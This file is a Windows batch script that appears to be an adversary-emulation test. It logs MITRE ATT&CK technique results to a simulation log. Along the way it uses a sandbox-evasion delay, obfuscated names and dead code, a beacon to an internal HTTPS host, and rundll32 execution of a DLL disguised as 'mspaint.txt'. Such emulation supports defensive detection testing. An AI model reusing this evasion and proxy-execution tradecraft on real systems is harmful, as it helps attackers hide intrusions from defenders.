@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - DO NOT modify)
SET yktnwwf=%APPDATA%\8851\6d6e07d9
SET fpakbq=Macula-Stage0-8851
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8851-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=mspaint.txt
SET fpldhe=8851

REM Log file setup
SET zxmqp=!APPDATA!\!yydue!\macula-simulations.log
SET qwzxc=!rdzgrnne!
SET mnbvf=!edjwtl!
SET plkmj=!yktnwwf!

REM Initial delay (evade sandbox)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start=30s>> "!zxmqp!" 2>nul
CHOICE /C Y /N /D Y /T 30 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete>> "!zxmqp!" 2>nul

SET state=0
GOTO qazwsx

REM Dead code block (unreachable)
:vcxtgb
SET fake=deadcode123
GOTO END

:qazwsx
IF !state!==0 GOTO plmkij
IF !state!==17 GOTO ujmnyh
IF !state!==25 GOTO tgbfre
IF !state!==99 GOTO END

REM More dead code
:wsxqaz
EXIT /B 1

:plmkij
REM Heartbeat operation (T1218 TTP log)
SET rtyui=1
SET yuiop=
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!rtyui!:!yuiop!>> "!zxmqp!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!zxmqp!" 2>nul
curl -k -s -o nul "!qwzxc!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete>> "!zxmqp!" 2>nul

SET state=17
ping -n 8 127.0.0.1 >nul
GOTO qazwsx

:zxcfgh
REM Dead code branch
GOTO END

:ujmnyh
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!plkmj!>> "!zxmqp!" 2>nul
cd /d "!plkmj!" 2>nul
IF NOT !ERRORLEVEL!==0 (
    SET rtyui=0
    SET yuiop=access_denied
) ELSE (
    SET rtyui=1
    SET yuiop=
)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_complete>> "!zxmqp!" 2>nul
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1083|File_and_Directory_Discovery=!rtyui!:!yuiop!>> "!zxmqp!" 2>nul

SET state=25
SET /A delay=!RANDOM! %% 15 + 5
timeout /t !delay! /nobreak >nul
GOTO qazwsx

:bnvcxz
REM Unreachable junk
SET junk=0
IF !junk!==1 GOTO END

:tgbfre
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start=!mnbvf!>> "!zxmqp!" 2>nul
%SystemRoot%\System32\rundll32.exe "!mnbvf!",DllMain
IF NOT !ERRORLEVEL!==0 (
    SET rtyui=0
    SET yuiop=load_failed
) ELSE (
    SET rtyui=1
    SET yuiop=
)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_complete>> "!zxmqp!" 2>nul
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218.011|Rundll32=!rtyui!:!yuiop!>> "!zxmqp!" 2>nul

SET state=99
timeout /t 10 /nobreak >nul
GOTO qazwsx

:poiuyt
REM Dead cleanup (never called)
del /f /q "!mnbvf!" 2>nul

:END